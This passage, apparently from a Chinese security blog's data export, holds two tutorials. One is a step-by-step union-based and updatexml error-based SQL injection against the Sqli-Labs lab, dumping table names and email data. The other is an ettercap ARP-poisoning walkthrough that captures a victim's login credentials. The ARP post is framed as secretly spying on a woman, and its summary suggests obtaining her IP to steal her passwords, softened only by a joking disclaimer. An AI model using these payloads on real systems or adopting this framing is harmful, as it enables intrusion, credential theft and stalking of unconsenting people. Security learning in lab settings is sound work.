class=\"headerlink\" title=\"显错注入具体流程\"></a>显错注入具体流程</h4><p>1.这里我们先打开靶场Sqli-Labs-less1。<br><img src=\"/images/pasted-45.png\" alt=\"upload successful\"></p>\n<p>2.提示知道了需要在GET传参处传入ID，那么就传入id=1试试。可以看到多了用户名和密码，那么这个页面就是很标准的get传参显示数据的页面了。<br><img src=\"/images/pasted-46.png\" alt=\"upload successful\"></p>\n<p>3.我们日常进行渗透测试的时候，对于这种id传参或者cid传参或者其他传参，最开始也是最喜欢的，便是传个单引号试试看，这里看到页面直接报错了。（ps:单引号经过了url编码变成了%27）单引号报错那就说明我们传入的1’造成了效果，看到这种情况，我们可以直接认定，这里存在sql注入，后面会教一种简单的方法，可以直接注入，这里先不细说。<br><img src=\"/images/pasted-47.png\" alt=\"upload successful\"></p>\n<p>4.报错了报错了，为了大家能够更加直观的了解，那么我们直接作弊，看看源码吧。有点乱，这里我们没有php基础了读者可能有点慌，不要紧哦，我们只需要知道我标的那句sql查询语句即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>\n<p>这里大概解释一下，这里是通过查询users表中的id字段中的第一行数据，可以看到，$id处就是我们输入的数据。好的回到之前查询报错处，因为我传入了id=1’ 被放到查询语句中，语句经过拼接变成：<strong>SELECT * FROM users WHERE id=’1’’ LIMIT 0,1</strong><br>这里发现了吗，我传入的单引号跟前面的单引号闭合了，可以这样理解，后面那个单引号就像一只单身狗，找不到伙伴，所以生气报错了。<br><img src=\"/images/pasted-48.png\" alt=\"upload successful\"></p>\n<p>5.那我只需要将后面的单引号丢掉，就可以页面正常显示了，这里使用#注释后面的语句（ps:#经过url编码变成了%23），可以看到，页面直接显示正常了。新的sql查询语句为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE id=&#x27;1&#x27; #&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>\n<p>#后面的东西被注释了，已经没有用了，那么我们就成功跳出了单引号，在单引号和#之间，我们就可以放入自己的语句进行执行。<br><img src=\"/images/pasted-49.png\" alt=\"upload successful\"></p>\n<p>6.因为这里是显错注入嘛，下一步就要通过order by查询数据库当前的字段数，具体传参为：?id=1’ order by 1#。order by 1页面正常，order by 2页面正常，order by 3页面正常，order by 4页面不正常。这就说明了当前表中的字段为3。<br><img src=\"/images/pasted-50.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-51.png\" alt=\"upload successful\"></p>\n<p>7.下一步就是联合查询了，传参为 <strong>?id=1’ union select 1,2,3 limit 1,1#</strong> ，这里我通过刚刚知道了字段数为3，所以将语句换成了union select 1,2,3 ，这样的语句在页面是可以正常执行的，但是返回的数据还是dump和dump，这不是我要的显错点，所以我加上了limit 1，1 ，取出第二段数据，成功看到了2和3，这里的2，3就是我们想要的显错点了。<br><img src=\"/images/pasted-52.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-53.png\" alt=\"upload successful\"></p>\n<p>8.嘿嘿，看到2和3了，接下来就好办了，替换2和3为执行语句，就可以获得对应的信息。这里学习3个基础函数：database() 查询当前数据库库名 , user() 查询当前登录的用户名, version() 查询当前数据库版本号。</p>\n<hr>\n<p>我把2换成了database()，这里成功查看到了库名security<br><img src=\"/images/pasted-54.png\" alt=\"upload successful\"></p>\n<p>9.这里普及一下，在mysql数据库中有一个information_schema表，这是系统自带的表，里面放入了我们从建库开始的所有操作，例如建表，加用户。这里给出一条查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union select 1,table_name,3 from information_schema.tables where </span><br><span class=\"line\">table_schema=database() limit 1,1# </span><br></pre></td></tr></table></figure>\n<p>这条语句通过查询了系统自带库获取了里面的表名emails<br><img src=\"/images/pasted-55.png\" alt=\"upload successful\"></p>\n<p>10.接下来查询这个表里面的字段，语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 1,1 </span><br></pre></td></tr></table></figure>\n<p>这里有个坑，表名在语句中是以字符串的形式存在的，所以需要加单引号。<br>这里的传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=database() limit 1,1#</span><br></pre></td></tr></table></figure>\n<p>看到第一个字段为id<br><img src=\"/images/pasted-56.png\" alt=\"upload successful\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=database() limit 2,1#</span><br></pre></td></tr></table></figure>\n<p>看到第二个字段为email_id<br><img src=\"/images/pasted-57.png\" alt=\"upload successful\"></p>\n<p>11.现在有表名emails，有字段名email_id，那就可以直接查询里面的数据了。将传参换成:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,id,email_id from emails limit 1,1#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-58.png\" alt=\"upload successful\"></p>\n<p>12.看到了吧，id为1的人的email为<a href=\"mailto:&#68;&#x75;&#109;&#98;&#64;&#100;&#104;&#x61;&#x6b;&#107;&#97;&#110;&#x2e;&#99;&#x6f;&#109;\">&#68;&#x75;&#109;&#98;&#64;&#100;&#104;&#x61;&#x6b;&#107;&#97;&#110;&#x2e;&#99;&#x6f;&#109;</a>。这就是显错注入的整个过程。因为说着说着，好像内容有点多，后面的内容就放到以后的推文吧，这里说一下前面说的那个“简单”的方法，在发现报错之后，放上这条语句，可以直接查询到数据库库名哦。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-59.png\" alt=\"upload successful\"></p>\n<p>13.报错注入具体详情请看另一篇文章哦！</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>显错注入：顾名思义，通过显错点进行注入。那么什么是显错点呢，就是数据库中的查询结果，通过联合查询的方式，叠加替换显示了我们输入的数据。接下来只需要替换数据为我们要查询的SQL语句，就可以得到我们想要的结果。</p>\n<h4 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h4><p><img src=\"/images/pasted-5.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-6.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-7.png\" alt=\"upload successful\"></p>\n<h4 id=\"漏洞之王SQL注入\"><a href=\"#漏洞之王SQL注入\" class=\"headerlink\" title=\"漏洞之王SQL注入\"></a>漏洞之王SQL注入</h4><p>在这里先简单介绍一下漏洞之王SQL注入：<br>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：</p>\n<ol>\n<li>   用户可以控制输入。</li>\n<li>   用户输入的数据被当作代码拼接到了数据库语句当中。</li>\n</ol>\n<h4 id=\"显错注入具体流程\"><a href=\"#显错注入具体流程\" class=\"headerlink\" title=\"显错注入具体流程\"></a>显错注入具体流程</h4><p>1.这里我们先打开靶场Sqli-Labs-less1。<br><img src=\"/images/pasted-45.png\" alt=\"upload successful\"></p>\n<p>2.提示知道了需要在GET传参处传入ID，那么就传入id=1试试。可以看到多了用户名和密码，那么这个页面就是很标准的get传参显示数据的页面了。<br><img src=\"/images/pasted-46.png\" alt=\"upload successful\"></p>\n<p>3.我们日常进行渗透测试的时候，对于这种id传参或者cid传参或者其他传参，最开始也是最喜欢的，便是传个单引号试试看，这里看到页面直接报错了。（ps:单引号经过了url编码变成了%27）单引号报错那就说明我们传入的1’造成了效果，看到这种情况，我们可以直接认定，这里存在sql注入，后面会教一种简单的方法，可以直接注入，这里先不细说。<br><img src=\"/images/pasted-47.png\" alt=\"upload successful\"></p>\n<p>4.报错了报错了，为了大家能够更加直观的了解，那么我们直接作弊，看看源码吧。有点乱，这里我们没有php基础了读者可能有点慌，不要紧哦，我们只需要知道我标的那句sql查询语句即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>\n<p>这里大概解释一下，这里是通过查询users表中的id字段中的第一行数据，可以看到，$id处就是我们输入的数据。好的回到之前查询报错处，因为我传入了id=1’ 被放到查询语句中，语句经过拼接变成：<strong>SELECT * FROM users WHERE id=’1’’ LIMIT 0,1</strong><br>这里发现了吗，我传入的单引号跟前面的单引号闭合了，可以这样理解，后面那个单引号就像一只单身狗，找不到伙伴，所以生气报错了。<br><img src=\"/images/pasted-48.png\" alt=\"upload successful\"></p>\n<p>5.那我只需要将后面的单引号丢掉，就可以页面正常显示了，这里使用#注释后面的语句（ps:#经过url编码变成了%23），可以看到，页面直接显示正常了。新的sql查询语句为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE id=&#x27;1&#x27; #&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>\n<p>#后面的东西被注释了，已经没有用了，那么我们就成功跳出了单引号，在单引号和#之间，我们就可以放入自己的语句进行执行。<br><img src=\"/images/pasted-49.png\" alt=\"upload successful\"></p>\n<p>6.因为这里是显错注入嘛，下一步就要通过order by查询数据库当前的字段数，具体传参为：?id=1’ order by 1#。order by 1页面正常，order by 2页面正常，order by 3页面正常，order by 4页面不正常。这就说明了当前表中的字段为3。<br><img src=\"/images/pasted-50.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-51.png\" alt=\"upload successful\"></p>\n<p>7.下一步就是联合查询了，传参为 <strong>?id=1’ union select 1,2,3 limit 1,1#</strong> ，这里我通过刚刚知道了字段数为3，所以将语句换成了union select 1,2,3 ，这样的语句在页面是可以正常执行的，但是返回的数据还是dump和dump，这不是我要的显错点，所以我加上了limit 1，1 ，取出第二段数据，成功看到了2和3，这里的2，3就是我们想要的显错点了。<br><img src=\"/images/pasted-52.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-53.png\" alt=\"upload successful\"></p>\n<p>8.嘿嘿，看到2和3了，接下来就好办了，替换2和3为执行语句，就可以获得对应的信息。这里学习3个基础函数：database() 查询当前数据库库名 , user() 查询当前登录的用户名, version() 查询当前数据库版本号。</p>\n<hr>\n<p>我把2换成了database()，这里成功查看到了库名security<br><img src=\"/images/pasted-54.png\" alt=\"upload successful\"></p>\n<p>9.这里普及一下，在mysql数据库中有一个information_schema表，这是系统自带的表，里面放入了我们从建库开始的所有操作，例如建表，加用户。这里给出一条查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union select 1,table_name,3 from information_schema.tables where </span><br><span class=\"line\">table_schema=database() limit 1,1# </span><br></pre></td></tr></table></figure>\n<p>这条语句通过查询了系统自带库获取了里面的表名emails<br><img src=\"/images/pasted-55.png\" alt=\"upload successful\"></p>\n<p>10.接下来查询这个表里面的字段，语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 1,1 </span><br></pre></td></tr></table></figure>\n<p>这里有个坑，表名在语句中是以字符串的形式存在的，所以需要加单引号。<br>这里的传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=database() limit 1,1#</span><br></pre></td></tr></table></figure>\n<p>看到第一个字段为id<br><img src=\"/images/pasted-56.png\" alt=\"upload successful\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=database() limit 2,1#</span><br></pre></td></tr></table></figure>\n<p>看到第二个字段为email_id<br><img src=\"/images/pasted-57.png\" alt=\"upload successful\"></p>\n<p>11.现在有表名emails，有字段名email_id，那就可以直接查询里面的数据了。将传参换成:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,id,email_id from emails limit 1,1#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-58.png\" alt=\"upload successful\"></p>\n<p>12.看到了吧，id为1的人的email为<a href=\"mailto:&#68;&#x75;&#109;&#98;&#64;&#100;&#104;&#x61;&#x6b;&#107;&#97;&#110;&#x2e;&#99;&#x6f;&#109;\">&#68;&#x75;&#109;&#98;&#64;&#100;&#104;&#x61;&#x6b;&#107;&#97;&#110;&#x2e;&#99;&#x6f;&#109;</a>。这就是显错注入的整个过程。因为说着说着，好像内容有点多，后面的内容就放到以后的推文吧，这里说一下前面说的那个“简单”的方法，在发现报错之后，放上这条语句，可以直接查询到数据库库名哦。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-59.png\" alt=\"upload successful\"></p>\n<p>13.报错注入具体详情请看另一篇文章哦！</p>\n"},{"title":"如何偷偷了解女神——ARP毒药攻击","keywords":"ARP欺骗,女神,mac地址,实战演示","description":"如何偷偷了解女神——ARP毒药攻击","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.51wendang.com%2Fpic%2Fc300ace510021256dc6dba05%2F1-810-jpg_6-1080-0-0-1080.jpg&refer=http%3A%2F%2Fwww.51wendang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915883&t=937aa034e18c55ac26f722976f6d62cd","date":"2020-05-28T09:33:34.000Z","_content":"\n\n\n最近学习了一种攻击——ARP毒药攻击。中间人攻击，也叫ARP欺骗，能够通过arp欺骗获取用户的数据，那么认真想想，这样能不能让自己更加了解女神呢，接下来就让我们来了解一下这个强大的攻击手法吧。\n\n### 中华人民共和国网络安全法\n文章开头，先学习一下中华人民共和国网络安全法，大家要做一名合法的白帽子，不要做一些违法乱纪的事情。\t\nhttps://www.cto.ac.cn/thread-106.htm\n\n![upload successful](/images/pasted-5.png)\n\n![upload successful](/images/pasted-6.png)\n\n![upload successful](/images/pasted-7.png)\n\n### 环境准备\n1.攻击机：kali虚拟机 （ip:192.168.163.128）\n![upload successful](/images/pasted-96.png)\n\n2.被攻击机：windows sever 2008 （ip: 192.168.163.131）\n![upload successful](/images/pasted-97.png)\n\n3.网关：win10物理机 （ip: 192.168.163.2）\n\n\n### 攻击原理\n\n访问一个地址需要一种协议叫ARP协议，我们的主机通过ARP协议获取了对应ip地址的mac地址来进行访问。\n\n情况是这样的，A访问某网站需要经过网关，这往往是直连的，但是第三方B，通过向A和网关发送数据包，修改了他们的mac地址指向了B，也就是说，A访问网关的数据包都会经过B再到达网关，达到了中间人攻击的效果。\n\n![upload successful](/images/pasted-98.jpg)\n\n### 攻击过程\n\n1.首先打开攻击机kali和靶机Windows server 2008\n![upload successful](/images/pasted-99.png)\n\n![upload successful](/images/pasted-100.png)\n\n2.在靶机命令行处通过arp –a命令获取了当前mac地址，网关192.168.163.2的mac地址为00-50-56-f3-04-25\n![upload successful](/images/pasted-101.png)\n\n\n3.攻击机机也查看一下，查看了当前mac地址为00:0c:29:bc:fd:f2\n![upload successful](/images/pasted-102.png)\n\n\n4.准备充分了，接下来在攻击机打开软件ettercap，通过-G参数打开图形化界面\n![upload successful](/images/pasted-103.png)\n\n\n5.刚打开的界面需要先选择收取信息的网卡，一般默认的eth0即可，然后打上勾勾进入软件。\n![upload successful](/images/pasted-104.png)\n\n\n6.进入软件后，额，因为是英文的，会有点烦，不过我们可以通过按钮来操作。\n先点击那个放大镜按钮获取当前网段存在的主机。\n![upload successful](/images/pasted-105.png)\n\n然后点击那个展示按钮查看信息。\n![upload successful](/images/pasted-106.png)\n\n\n7.接下来就是选择目标了，将靶机192.168.163.131加入target 1；将网关192.168.163.2加入target2（这里也可以批量欺骗，就是target1可以加入多个进行欺骗）\n![upload successful](/images/pasted-107.png)\n\n\n8.选完了目标之后，可以进行攻击了。点击右上角那个地球一样的按钮，选择第一个ARP pois……；进去之后选择第一个sniff remote connections（嗅探远程连接） 打勾，点ok就可以了。\n![upload successful](/images/pasted-108.png)\n\n![upload successful](/images/pasted-109.png)\n\n\n9.开始攻击之后在页面下面是可以看到已经建立了连接。\n![upload successful](/images/pasted-110.png)\n\n同样的，在靶机上也可以看到，网关的mac地址变了，变成了跟攻击机的地址一样了，这也就是说，已经欺骗成功了\n![upload successful](/images/pasted-111.png)\n\n\n10.这就算攻击成功了吗?当然没有，接下来就是当靶机进行网络访问，登录账号密码的时候，能够在攻击机上查看到账号密码。\t\n先使用靶机登录某界面。\n![upload successful](/images/pasted-112.png)\n\n\n11.为了能够直观点我将密码显示出来（在密码处右键检查，在弹出来的框处找到type=\"password\"，修改成type=\"text\"即可）。\n![upload successful](/images/pasted-113.png)\n\n12.点击了登录后，回到攻击机，已经获取了账号密码以及被我打码的网址。\n![upload successful](/images/pasted-114.png)\n\n### 总结\n\n就这样，我们获取了靶机的账号密码，如果是想要女神的账号密码，只需要想办法将ip弄到手就可以了哦。当然这里不仅仅是获取账号密码，可以使用其他抓包软件，获取其他数据包。当然这里还是以学习为主，大家开开玩笑就好，不要真的去偷人家数据。\n\n### ARP欺骗防御\n\narp欺骗当然也是可以防御的，对于我们客户端，可以将mac地址设置为静态的，只允许手动更改。对于服务器端，可以对于站点加个ssl加密，也就是http -- > https。\n\n参考链接：\nhttps://www.cnblogs.com/ichunqiu/p/5662832.html","source":"_posts/如何偷偷了解女神——ARP毒药.md","raw":"---\ntitle: 如何偷偷了解女神——ARP毒药攻击\ntags: \n  - ARP欺骗\n  - 女神\n  - mac地址\n  - 实战演示\ncategories: ARP欺骗\nkeywords: 'ARP欺骗,女神,mac地址,实战演示'\ndescription: 如何偷偷了解女神——ARP毒药攻击\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.51wendang.com%2Fpic%2Fc300ace510021256dc6dba05%2F1-810-jpg_6-1080-0-0-1080.jpg&refer=http%3A%2F%2Fwww.51wendang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915883&t=937aa034e18c55ac26f722976f6d62cd\ndate: 2020-05-28 17:33:34\n---\n\n\n\n最近学习了一种攻击——ARP毒药攻击。中间人攻击，也叫ARP欺骗，能够通过arp欺骗获取用户的数据，那么认真想想，这样能不能让自己更加了解女神呢，接下来就让我们来了解一下这个强大的攻击手法吧。\n\n### 中华人民共和国网络安全法\n文章开头，先学习一下中华人民共和国网络安全法，大家要做一名合法的白帽子，不要做一些违法乱纪的事情。\t\nhttps://www.cto.ac.cn/thread-106.htm\n\n![upload successful](/images/pasted-5.png)\n\n![upload successful](/images/pasted-6.png)\n\n![upload successful](/images/pasted-7.png)\n\n### 环境准备\n1.攻击机：kali虚拟机 （ip:192.168.163.128）\n![upload successful](/images/pasted-96.png)\n\n2.被攻击机：windows sever 2008 （ip: 192.168.163.131）\n![upload successful](/images/pasted-97.png)\n\n3.网关：win10物理机 （ip: 192.168.163.2）\n\n\n### 攻击原理\n\n访问一个地址需要一种协议叫ARP协议，我们的主机通过ARP协议获取了对应ip地址的mac地址来进行访问。\n\n情况是这样的，A访问某网站需要经过网关，这往往是直连的，但是第三方B，通过向A和网关发送数据包，修改了他们的mac地址指向了B，也就是说，A访问网关的数据包都会经过B再到达网关，达到了中间人攻击的效果。\n\n![upload successful](/images/pasted-98.jpg)\n\n### 攻击过程\n\n1.首先打开攻击机kali和靶机Windows server 2008\n![upload successful](/images/pasted-99.png)\n\n![upload successful](/images/pasted-100.png)\n\n2.在靶机命令行处通过arp –a命令获取了当前mac地址，网关192.168.163.2的mac地址为00-50-56-f3-04-25\n![upload successful](/images/pasted-101.png)\n\n\n3.攻击机机也查看一下，查看了当前mac地址为00:0c:29:bc:fd:f2\n![upload successful](/images/pasted-102.png)\n\n\n4.准备充分了，接下来在攻击机打开软件ettercap，通过-G参数打开图形化界面\n![upload successful](/images/pasted-103.png)\n\n\n5.刚打开的界面需要先选择收取信息的网卡，一般默认的eth0即可，然后打上勾勾进入软件。\n![upload successful](/images/pasted-104.png)\n\n\n6.进入软件后，额，因为是英文的，会有点烦，不过我们可以通过按钮来操作。\n先点击那个放大镜按钮获取当前网段存在的主机。\n![upload successful](/images/pasted-105.png)\n\n然后点击那个展示按钮查看信息。\n![upload successful](/images/pasted-106.png)\n\n\n7.接下来就是选择目标了，将靶机192.168.163.131加入target 1；将网关192.168.163.2加入target2（这里也可以批量欺骗，就是target1可以加入多个进行欺骗）\n![upload successful](/images/pasted-107.png)\n\n\n8.选完了目标之后，可以进行攻击了。点击右上角那个地球一样的按钮，选择第一个ARP pois……；进去之后选择第一个sniff remote connections（嗅探远程连接） 打勾，点ok就可以了。\n![upload successful](/images/pasted-108.png)\n\n![upload successful](/images/pasted-109.png)\n\n\n9.开始攻击之后在页面下面是可以看到已经建立了连接。\n![upload successful](/images/pasted-110.png)\n\n同样的，在靶机上也可以看到，网关的mac地址变了，变成了跟攻击机的地址一样了，这也就是说，已经欺骗成功了\n![upload successful](/images/pasted-111.png)\n\n\n10.这就算攻击成功了吗?当然没有，接下来就是当靶机进行网络访问，登录账号密码的时候，能够在攻击机上查看到账号密码。\t\n先使用靶机登录某界面。\n![upload successful](/images/pasted-112.png)\n\n\n11.为了能够直观点我将密码显示出来（在密码处右键检查，在弹出来的框处找到type=\"password\"，修改成type=\"text\"即可）。\n![upload successful](/images/pasted-113.png)\n\n12.点击了登录后，回到攻击机，已经获取了账号密码以及被我打码的网址。\n![upload successful](/images/pasted-114.png)\n\n### 总结\n\n就这样，我们获取了靶机的账号密码，如果是想要女神的账号密码，只需要想办法将ip弄到手就可以了哦。当然这里不仅仅是获取账号密码，可以使用其他抓包软件，获取其他数据包。当然这里还是以学习为主，大家开开玩笑就好，不要真的去偷人家数据。\n\n### ARP欺骗防御\n\narp欺骗当然也是可以防御的，对于我们客户端，可以将mac地址设置为静态的，只允许手动更改。对于服务器端，可以对于站点加个ssl加密，也就是http -- > https。\n\n参考链接：\nhttps://www.cnblogs.com/ichunqiu/p/5662832.html","slug":"如何偷偷了解女神——ARP毒药","published":1,"updated":"2021-08-07T16:20:36.560Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfd000qvkq31kpm1r6y","content":"<p>最近学习了一种攻击——ARP毒药攻击。中间人攻击，也叫ARP欺骗，能够通过arp欺骗获取用户的数据，那么认真想想，这样能不能让自己更加了解女神呢，接下来就让我们来了解一下这个强大的攻击手法吧。</p>\n<h3 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h3><p>文章开头，先学习一下中华人民共和国网络安全法，大家要做一名合法的白帽子，不要做一些违法乱纪的事情。<br><a href=\"https://www.cto.ac.cn/thread-106.htm\">https://www.cto.ac.cn/thread-106.htm</a></p>\n<p><img src=\"/images/pasted-5.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-6.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-7.png\" alt=\"upload successful\"></p>\n<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>1.攻击机：kali虚拟机 （ip:192.168.163.128）<br><img src=\"/images/pasted-96.png\" alt=\"upload successful\"></p>\n<p>2.被攻击机：windows sever 2008 （ip: 192.168.163.131）<br><img src=\"/images/pasted-97.png\" alt=\"upload successful\"></p>\n<p>3.网关：win10物理机 （ip: 192.168.163.2）</p>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>访问一个地址需要一种协议叫ARP协议，我们的主机通过ARP协议获取了对应ip地址的mac地址来进行访问。</p>\n<p>情况是这样的，A访问某网站需要经过网关，这往往是直连的，但是第三方B，通过向A和网关发送数据包，修改了他们的mac地址指向了B，也就是说，A访问网关的数据包都会经过B再到达网关，达到了中间人攻击的效果。</p>\n<p><img src=\"/images/pasted-98.jpg\" alt=\"upload successful\"></p>\n<h3 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h3><p>1.首先打开攻击机kali和靶机Windows server 2008<br><img src=\"/images/pasted-99.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-100.png\" alt=\"upload successful\"></p>\n<p>2.在靶机命令行处通过arp –a命令获取了当前mac地址，网关192.168.163.2的mac地址为00-50-56-f3-04-25<br><img src=\"/images/pasted-101.png\" alt=\"upload successful\"></p>\n<p>3.攻击机机也查看一下，查看了当前mac地址为00:0c:29:bc:fd:f2<br><img src=\"/images/pasted-102.png\" alt=\"upload successful\"></p>\n<p>4.准备充分了，接下来在攻击机打开软件ettercap，通过-G参数打开图形化界面<br><img src=\"/images/pasted-103.png\" alt=\"upload successful\"></p>\n<p>5.刚打开的界面需要先选择收取信息的网卡，一般默认的eth0即可，然后打上勾勾进入软件。<br><img src=\"/images/pasted-104.png\" alt=\"upload successful\"></p>\n<p>6.进入软件后，额，因为是英文的，会有点烦，不过我们可以通过按钮来操作。<br>先点击那个放大镜按钮获取当前网段存在的主机。<br><img src=\"/images/pasted-105.png\" alt=\"upload successful\"></p>\n<p>然后点击那个展示按钮查看信息。<br><img src=\"/images/pasted-106.png\" alt=\"upload successful\"></p>\n<p>7.接下来就是选择目标了，将靶机192.168.163.131加入target 1；将网关192.168.163.2加入target2（这里也可以批量欺骗，就是target1可以加入多个进行欺骗）<br><img src=\"/images/pasted-107.png\" alt=\"upload successful\"></p>\n<p>8.选完了目标之后，可以进行攻击了。点击右上角那个地球一样的按钮，选择第一个ARP pois……；进去之后选择第一个sniff remote connections（嗅探远程连接） 打勾，点ok就可以了。<br><img src=\"/images/pasted-108.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-109.png\" alt=\"upload successful\"></p>\n<p>9.开始攻击之后在页面下面是可以看到已经建立了连接。<br><img src=\"/images/pasted-110.png\" alt=\"upload successful\"></p>\n<p>同样的，在靶机上也可以看到，网关的mac地址变了，变成了跟攻击机的地址一样了，这也就是说，已经欺骗成功了<br><img src=\"/images/pasted-111.png\" alt=\"upload successful\"></p>\n<p>10.这就算攻击成功了吗?当然没有，接下来就是当靶机进行网络访问，登录账号密码的时候，能够在攻击机上查看到账号密码。<br>先使用靶机登录某界面。<br><img src=\"/images/pasted-112.png\" alt=\"upload successful\"></p>\n<p>11.为了能够直观点我将密码显示出来（在密码处右键检查，在弹出来的框处找到type=”password”，修改成type=”text”即可）。<br><img src=\"/images/pasted-113.png\" alt=\"upload successful\"></p>\n<p>12.点击了登录后，回到攻击机，已经获取了账号密码以及被我打码的网址。<br><img src=\"/images/pasted-114.png\" alt=\"upload successful\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" 